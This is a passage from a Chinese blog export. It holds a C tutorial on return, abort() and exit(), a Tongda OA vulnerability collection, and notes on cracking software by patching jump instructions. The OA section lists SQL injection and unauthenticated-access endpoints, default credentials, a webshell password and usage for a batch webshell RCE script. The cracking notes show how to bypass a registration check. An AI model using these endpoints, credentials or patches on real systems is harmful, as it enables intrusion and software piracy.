<h3 id="do-while-2"><a href="#do-while-2" class="headerlink" title="do-while"></a>do-while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写一个函数，用于计算给定数字的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 输入不合法，返回 -1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        result *= i;</span><br><span class="line">        i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i &lt;= num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = factorial(number);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d 的阶乘为：%d\n&quot;</span>, number, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;输入不合法。\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001174739587.png" alt="image-20231001174739587"></p>
<p>本质上就是用return来根据不同情况让函数返回不同的值</p>
<h1 id="abort"><a href="#abort" class="headerlink" title="abort()"></a>abort()</h1><h2 id="基本作用-3"><a href="#基本作用-3" class="headerlink" title="基本作用"></a>基本作用</h2><p>菜鸟教程中对它的描述是这样的：C 库函数 <strong>void abort(void)</strong> 中止程序执行，直接从调用的地方跳出。</p>
<p>在C语言中，<code>abort()</code> 是一个库函数，用于终止程序的执行并生成一个异常终止信号。它通常在程序遇到无法恢复的严重错误时使用，如内存分配失败、文件读写错误等。 <code>abort()</code> 函数会引发一个异常，这个异常可以被操作系统或调试器捕获并进行相应处理。</p>
<h2 id="在各种循环结构中的例子-3"><a href="#在各种循环结构中的例子-3" class="headerlink" title="在各种循环结构中的例子"></a>在各种循环结构中的例子</h2><h3 id="while-3"><a href="#while-3" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环结束\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001181143831.png" alt="image-20231001181143831"></p>
<p>其他例子就不举了，都差不多，会弹出一个报错，然后终止整个程序，不会执行本程序最后的“循环结束”</p>
<h1 id="exit"><a href="#exit" class="headerlink" title="exit()"></a>exit()</h1><h2 id="基本作用-4"><a href="#基本作用-4" class="headerlink" title="基本作用"></a>基本作用</h2><p>菜鸟教程的描述：C 库函数 <strong>void exit(int status)</strong> 立即终止调用进程。任何属于该进程的打开的文件描述符都会被关闭，该进程的子进程由进程 1 继承，初始化，且会向父进程发送一个 SIGCHLD 信号。</p>
<h2 id="在各种循环结构中的例子-4"><a href="#在各种循环结构中的例子-4" class="headerlink" title="在各种循环结构中的例子"></a>在各种循环结构中的例子</h2><p>之前都说错了，什么循环函数，明明是循环结构。</p>
<h3 id="while-4"><a href="#while-4" class="headerlink" title="while"></a>while</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i);</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;这里不会被执行\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/%E8%B7%B3%E5%87%BA%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5-%E8%AF%A6%E8%A7%A3/image-20231001182439955.png" alt="image-20231001182439955"></p>
<p>这个函数也简单，exit和abort都是直接退出整个程序，只不过abort是要报错的，return是退出这个函数回到调用的地方，break和continue只在循环层次上跳出。</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>通达oa漏洞合集</title>
    <url>/2022/09/07/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="通达oa漏洞合集"><a href="#通达oa漏洞合集" class="headerlink" title="通达oa漏洞合集"></a>通达oa漏洞合集</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http[s]://TongDaOA.domain/inc/expired.php 判断通达版本</span><br><span class="line">http[s]://TongDaOA.domain/inc/reg_trial.php</span><br><span class="line">http[s]://TongDaOA.domain/inc/reg_trial_submit.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php</span><br><span class="line">GET 参数username、email 可爆用户、邮箱</span><br><span class="line">http[s]://TongDaOA.domain/resque/worker.php 计算机名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2013-2017(SQLi path)</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/getData.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/getValue.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/select/index.php </span><br><span class="line">http[s]://TongDaOA.domain/module/crm2010/share/update.php </span><br><span class="line">http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php</span><br><span class="line">http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID=</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/account_care_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/action_link_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/contract_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/payment_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/task/crm/storage_near_remind.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/myoa.php</span><br><span class="line">http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v11~v11.6 [0day]</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php</span><br><span class="line">http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/design/report/action.php</span><br><span class="line">http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php</span><br><span class="line">http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php</span><br><span class="line">http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php</span><br><span class="line">http[s]://TongDaOA.domain/interface/GetNewAPP.php</span><br><span class="line">http[s]://TongDaOA.domain/interface/GetNewAPP1.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php</span><br><span class="line">http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v11.6 [RCE]</span><br><span class="line"></span><br><span class="line">http[s]://TongDaOA.domain/module/appbuilder/assets/print.php 任意文件删除</span><br></pre></td></tr></table></figure>

<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">未授权访问各种会议通知信息</span><br><span class="line">poc:</span><br><span class="line">/general/calendar/arrange/get_cal_list.php?starttime=1548058874&amp;endtime=1597997506&amp;view=agendaDay</span><br></pre></td></tr></table></figure>

<h2 id="批量写吗"><a href="#批量写吗" class="headerlink" title="批量写吗"></a>批量写吗</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、影响版本：</span><br><span class="line">    tongdaOA V11</span><br><span class="line">    tangdaOA 2017</span><br><span class="line">    tangdaOA 2016</span><br><span class="line">    tangdaOA 2015</span><br><span class="line">    tangdaOA 2013 增强版</span><br><span class="line">    tangdaOA 2013</span><br><span class="line">2、已经测试版本</span><br><span class="line">    v2017 </span><br><span class="line">    v11    </span><br><span class="line">3、出处</span><br><span class="line">    https://github.com/NS-Sp4ce/TongDaOA-Fake-User</span><br><span class="line">    https://github.com/jas502n/OA-tongda-RCE    </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4、脚本在本地</span><br><span class="line">    ～/tools/tongda_oa_rce</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5、使用方法</span><br><span class="line">    python3 tongda.py http://www.xxx.com:8086        #通达oa界面</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6、木马链接密码</span><br><span class="line">    a</span><br></pre></td></tr></table></figure>

<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认密码后台源代码有</span><br><span class="line">    111111</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认用户名</span><br><span class="line">    root</span><br><span class="line">    admin</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>逆向学习笔记1（某爱技术吧的vip基础教程</title>
    <url>/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="逆向学习笔记1（某爱技术吧的vip基础教程"><a href="#逆向学习笔记1（某爱技术吧的vip基础教程" class="headerlink" title="逆向学习笔记1（某爱技术吧的vip基础教程"></a>逆向学习笔记1（某爱技术吧的vip基础教程</h1><p>某爱技术吧的vip基础教程</p>
<h1 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6.常用汇编指令的认识</span><br><span class="line">                  软件破解常用汇编指令 </span><br><span class="line"></span><br><span class="line">   cmp    a,b     //  比较a与b</span><br><span class="line">   mov    a,b     //  把b值送给a值，使a=b</span><br><span class="line">   ret            //  返回主程序</span><br><span class="line">   nop            //  无作用</span><br><span class="line">   call           //  调用子程序，子程序以ret结尾</span><br><span class="line">   je或jz         //  相等则跳（机器码是74或84）</span><br><span class="line">   jne或jnz       //  不相等则跳（机器码是75或85）</span><br><span class="line">   jmp            //  无条件跳（机器码是EB）</span><br><span class="line">   jb             //  若小于则跳</span><br><span class="line">   ja             //  若大于则跳</span><br><span class="line">   jg             //  若大于则跳</span><br><span class="line">   jge            //  若大于等于则跳</span><br><span class="line">   jl             //  若小于则跳</span><br><span class="line">   pop xxx        //  xxx出栈</span><br><span class="line">   push xxx       //  xxx压栈</span><br><span class="line">		★★破解经典句式★★</span><br><span class="line">1.(最常用)</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ] </span><br><span class="line">    call 00??????       关键call</span><br><span class="line">    test eax eax     </span><br><span class="line">    jz(jnz)或  jne(je)  关键跳转</span><br><span class="line">2 (最常用)</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ]</span><br><span class="line">    call 00??????       关键call</span><br><span class="line">    jne(je)             关键跳转</span><br><span class="line">3</span><br><span class="line">  mov eax [  ]</span><br><span class="line">  mov edx [  ]</span><br><span class="line">  cmp eax,edx</span><br><span class="line">  jnz(jz)</span><br><span class="line">4</span><br><span class="line">    lea edi [    ]</span><br><span class="line">    lea esi [    ]</span><br><span class="line">    repz cmpsd</span><br><span class="line">    jz(jnz)</span><br><span class="line">5</span><br><span class="line">    mov  eax [      ]</span><br><span class="line">    mov  edx [      ]</span><br><span class="line">    call 00??????</span><br><span class="line">    setz (setnz) al (bl,cl…)</span><br><span class="line">6</span><br><span class="line">    mov  eax [      ] </span><br><span class="line">    mov  edx [      ] </span><br><span class="line">    call 00??????</span><br><span class="line">    test eax eax</span><br><span class="line">    setz (setnz) bl,cl…</span><br><span class="line">7</span><br><span class="line">    call 00??????  ***</span><br><span class="line">    push eax (ebx,ecx…)</span><br><span class="line">    ……</span><br><span class="line">    ……</span><br><span class="line">    call 00??????</span><br><span class="line">    pop eax (ebx,ecx…)</span><br><span class="line">    test eax eax</span><br><span class="line">    jz(jnz)</span><br><span class="line">一、数据传输指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">    它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据. </span><br><span class="line">    1. 通用数据传送指令. </span><br><span class="line">        MOV    传送字或字节. </span><br><span class="line">        MOVSX  先符号扩展,再传送. </span><br><span class="line">        MOVZX  先零扩展,再传送. </span><br><span class="line">        PUSH    把字压入堆栈. </span><br><span class="line">        POP    把字弹出堆栈. </span><br><span class="line">        PUSHA  把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈. </span><br><span class="line">        POPA    把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈. </span><br><span class="line">        PUSHAD  把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈. </span><br><span class="line">        POPAD  把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈. </span><br><span class="line">        BSWAP  交换32位寄存器里字节的顺序 </span><br><span class="line">        XCHG    交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数) </span><br><span class="line">        CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX ) </span><br><span class="line">        XADD    先交换再累加.( 结果在第一个操作数里 ) </span><br><span class="line">        XLAT    字节查表转换. </span><br><span class="line">                ── BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即 </span><br><span class="line">                0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL ) </span><br><span class="line">    2. 输入输出端口传送指令. </span><br><span class="line">        IN      I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; ) </span><br><span class="line">        OUT    I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 ) </span><br><span class="line">          输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时, </span><br><span class="line">          其范围是 0-65535. </span><br><span class="line">    3. 目的地址传送指令. </span><br><span class="line">        LEA    装入有效地址. </span><br><span class="line">          例: LEA DX,string  ;把偏移地址存到DX. </span><br><span class="line">        LDS    传送目标指针,把指针内容装入DS. </span><br><span class="line">          例: LDS SI,string  ;把段地址:偏移地址存到DS:SI. </span><br><span class="line">        LES    传送目标指针,把指针内容装入ES. </span><br><span class="line">          例: LES DI,string  ;把段地址:偏移地址存到ES:DI. </span><br><span class="line">        LFS    传送目标指针,把指针内容装入FS. </span><br><span class="line">          例: LFS DI,string  ;把段地址:偏移地址存到FS:DI. </span><br><span class="line">        LGS    传送目标指针,把指针内容装入GS. </span><br><span class="line">          例: LGS DI,string  ;把段地址:偏移地址存到GS:DI. </span><br><span class="line">        LSS    传送目标指针,把指针内容装入SS. </span><br><span class="line">          例: LSS DI,string  ;把段地址:偏移地址存到SS:DI. </span><br><span class="line">    4. 标志传送指令. </span><br><span class="line">        LAHF    标志寄存器传送,把标志装入AH. </span><br><span class="line">        SAHF    标志寄存器传送,把AH内容装入标志寄存器. </span><br><span class="line">        PUSHF  标志入栈. </span><br><span class="line">        POPF    标志出栈. </span><br><span class="line">        PUSHD  32位标志入栈. </span><br><span class="line">        POPD    32位标志出栈. </span><br><span class="line"></span><br><span class="line">二、算术运算指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　ADD    加法. </span><br><span class="line">        ADC    带进位加法. </span><br><span class="line">        INC    加 1. </span><br><span class="line">        AAA    加法的ASCII码调整. </span><br><span class="line">        DAA    加法的十进制调整. </span><br><span class="line">        SUB    减法. </span><br><span class="line">        SBB    带借位减法. </span><br><span class="line">        DEC    减 1. </span><br><span class="line">        NEC    求反(以 0 减之). </span><br><span class="line">        CMP    比较.(两操作数作减法,仅修改标志位,不回送结果). </span><br><span class="line">        AAS    减法的ASCII码调整. </span><br><span class="line">        DAS    减法的十进制调整. </span><br><span class="line">        MUL    无符号乘法. </span><br><span class="line">        IMUL    整数乘法. </span><br><span class="line">          以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算), </span><br><span class="line">        AAM    乘法的ASCII码调整. </span><br><span class="line">        DIV    无符号除法. </span><br><span class="line">        IDIV    整数除法. </span><br><span class="line">          以上两条,结果回送: </span><br><span class="line">              商回送AL,余数回送AH, (字节运算); </span><br><span class="line">          或  商回送AX,余数回送DX, (字运算). </span><br><span class="line">        AAD    除法的ASCII码调整. </span><br><span class="line">        CBW    字节转换为字. (把AL中字节的符号扩展到AH中去) </span><br><span class="line">        CWD    字转换为双字. (把AX中的字的符号扩展到DX中去) </span><br><span class="line">        CWDE    字转换为双字. (把AX中的字符号扩展到EAX中去) </span><br><span class="line">        CDQ    双字扩展.    (把EAX中的字的符号扩展到EDX中去) </span><br><span class="line"></span><br><span class="line">三、逻辑运算指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　AND    与运算. </span><br><span class="line">        OR      或运算. </span><br><span class="line">        XOR    异或运算. </span><br><span class="line">        NOT    取反. </span><br><span class="line">        TEST    测试.(两操作数作与运算,仅修改标志位,不回送结果). </span><br><span class="line">        SHL    逻辑左移. </span><br><span class="line">        SAL    算术左移.(=SHL) </span><br><span class="line">        SHR    逻辑右移. </span><br><span class="line">        SAR    算术右移.(=SHR) </span><br><span class="line">        ROL    循环左移. </span><br><span class="line">        ROR    循环右移. </span><br><span class="line">        RCL    通过进位的循环左移. </span><br><span class="line">        RCR    通过进位的循环右移. </span><br><span class="line">          以上八种移位指令,其移位次数可达255次. </span><br><span class="line">              移位一次时, 可直接用操作码.  如 SHL AX,1. </span><br><span class="line">              移位&gt;1次时, 则由寄存器CL给出移位次数. </span><br><span class="line">                如  MOV CL,04 </span><br><span class="line">                    SHL AX,CL </span><br><span class="line"></span><br><span class="line">四、串指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">            　DS:SI  源串段寄存器  :源串变址. </span><br><span class="line">            ES:DI  目标串段寄存器:目标串变址. </span><br><span class="line">            CX      重复次数计数器. </span><br><span class="line">            AL/AX  扫描值. </span><br><span class="line">            D标志  0表示重复操作中SI和DI应自动增量; 1表示应自动减量. </span><br><span class="line">            Z标志  用来控制扫描或比较操作的结束. </span><br><span class="line">        MOVS    串传送. </span><br><span class="line">            ( MOVSB  传送字符.    MOVSW  传送字.    MOVSD  传送双字. ) </span><br><span class="line">        CMPS    串比较. </span><br><span class="line">            ( CMPSB  比较字符.    CMPSW  比较字. ) </span><br><span class="line">        SCAS    串扫描. </span><br><span class="line">            把AL或AX的内容与目标串作比较,比较结果反映在标志位. </span><br><span class="line">        LODS    装入串. </span><br><span class="line">            把源串中的元素(字或字节)逐一装入AL或AX中. </span><br><span class="line">            ( LODSB  传送字符.    LODSW  传送字.    LODSD  传送双字. ) </span><br><span class="line">        STOS    保存串. </span><br><span class="line">            是LODS的逆过程. </span><br><span class="line">        REP            当CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPE/REPZ      当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPNE/REPNZ    当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPC          当CF=1且CX/ECX&lt;&gt;0时重复. </span><br><span class="line">        REPNC          当CF=0且CX/ECX&lt;&gt;0时重复. </span><br><span class="line"></span><br><span class="line">五、程序转移指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">    　1&gt;无条件转移指令 (长转移) </span><br><span class="line">        JMP    无条件转移指令 </span><br><span class="line">        CALL    过程调用 </span><br><span class="line">        RET/RETF过程返回. </span><br><span class="line">    2&gt;条件转移指令 (短转移,-128到+127的距离内) </span><br><span class="line">        ( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 ) </span><br><span class="line">        JA/JNBE 不小于或不等于时转移. </span><br><span class="line">        JAE/JNB 大于或等于转移. </span><br><span class="line">        JB/JNAE 小于转移. </span><br><span class="line">        JBE/JNA 小于或等于转移. </span><br><span class="line">          以上四条,测试无符号整数运算的结果(标志C和Z). </span><br><span class="line">        JG/JNLE 大于转移. </span><br><span class="line">        JGE/JNL 大于或等于转移. </span><br><span class="line">        JL/JNGE 小于转移. </span><br><span class="line">        JLE/JNG 小于或等于转移. </span><br><span class="line">          以上四条,测试带符号整数运算的结果(标志S,O和Z). </span><br><span class="line">        JE/JZ  等于转移. </span><br><span class="line">        JNE/JNZ 不等于时转移. </span><br><span class="line">        JC      有进位时转移. </span><br><span class="line">        JNC    无进位时转移. </span><br><span class="line">        JNO    不溢出时转移. </span><br><span class="line">        JNP/JPO 奇偶性为奇数时转移. </span><br><span class="line">        JNS    符号位为 &quot;0&quot; 时转移. </span><br><span class="line">        JO      溢出转移. </span><br><span class="line">        JP/JPE  奇偶性为偶数时转移. </span><br><span class="line">        JS      符号位为 &quot;1&quot; 时转移. </span><br><span class="line">    3&gt;循环控制指令(短转移) </span><br><span class="line">        LOOP            CX不为零时循环. </span><br><span class="line">        LOOPE/LOOPZ    CX不为零且标志Z=1时循环. </span><br><span class="line">        LOOPNE/LOOPNZ  CX不为零且标志Z=0时循环. </span><br><span class="line">        JCXZ            CX为零时转移. </span><br><span class="line">        JECXZ          ECX为零时转移. </span><br><span class="line">    4&gt;中断指令 </span><br><span class="line">        INT    中断指令 </span><br><span class="line">        INTO    溢出中断 </span><br><span class="line">        IRET    中断返回 </span><br><span class="line">    5&gt;处理器控制指令 </span><br><span class="line">        HLT    处理器暂停, 直到出现中断或复位信号才继续. </span><br><span class="line">        WAIT    当芯片引线TEST为高电平时使CPU进入等待状态. </span><br><span class="line">        ESC    转换到外处理器. </span><br><span class="line">        LOCK    封锁总线. </span><br><span class="line">        NOP    空操作. </span><br><span class="line">        STC    置进位标志位. </span><br><span class="line">        CLC    清进位标志位. </span><br><span class="line">        CMC    进位标志取反. </span><br><span class="line">        STD    置方向标志位. </span><br><span class="line">        CLD    清方向标志位. </span><br><span class="line">        STI    置中断允许位. </span><br><span class="line">        CLI    清中断允许位. </span><br><span class="line"></span><br><span class="line">六、伪指令 </span><br><span class="line">─────────────────────────────────────── </span><br><span class="line">        　　DW      定义字(2字节). </span><br><span class="line">        PROC    定义过程. </span><br><span class="line">        ENDP    过程结束. </span><br><span class="line">        SEGMENT 定义段. </span><br><span class="line">        ASSUME  建立段寄存器寻址. </span><br><span class="line">        ENDS    段结束. </span><br><span class="line">        END    程序结束. </span><br></pre></td></tr></table></figure>



<h1 id="破解第一个简单的程序"><a href="#破解第一个简单的程序" class="headerlink" title="破解第一个简单的程序"></a>破解第一个简单的程序</h1><p>就是一个简单的易语言工具</p>
<p>基本破解的四个步骤，但这个课程看着就很老了，笔者只是学一学看看，毕竟也是经典课程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.查壳</span><br><span class="line"></span><br><span class="line">2.寻找关键字或断点（使用中文搜索引擎或者）</span><br><span class="line"></span><br><span class="line">3.找到关键跳转或者关键call</span><br><span class="line"></span><br><span class="line">4.修改达到破解的目的</span><br><span class="line"></span><br><span class="line">ctrl+g     输入00401000来到程序的入口点（所有exe程序的入口点）</span><br><span class="line"></span><br><span class="line">ctrl+f     输入要查找的信息</span><br></pre></td></tr></table></figure>

<p>小知识</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汇编jmp 就是无条件跳转</span><br><span class="line">od下断点 可以右键 可以f2</span><br><span class="line">je 大概是关键跳转的意思</span><br><span class="line">od工具 f9是运行程序</span><br><span class="line">od工具 f8是单步往下走</span><br><span class="line">关键跳转步骤的时候可以试一下，je改成jne，jne改成je，jz就改成jnz，jnz就改成jz</span><br><span class="line">右键</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905110245394.png" alt="image-20220905110245394"></p>
<p>这个大于号是有跳转跳转进来的意思，红色的线就是会跳转的，灰色的线就是不会跳转的</p>
<p>这个程序这里就是关键跳转步骤，输入正确就不会跳转，输入错误就会跳转</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905140633949.png" alt="image-20220905140633949"></p>
<p>我们把他改成jne</p>
<p><img src="/2022/09/05/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01-%E6%9F%90%E7%88%B1%E6%8A%80%E6%9C%AF%E5%90%A7%E7%9A%84vip%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/image-20220905141047226.png" alt="image-20220905141047226"></p>
<p>成功</p>
<p>当然也可以使用nop填充，就是直接右键nop填充。</p>
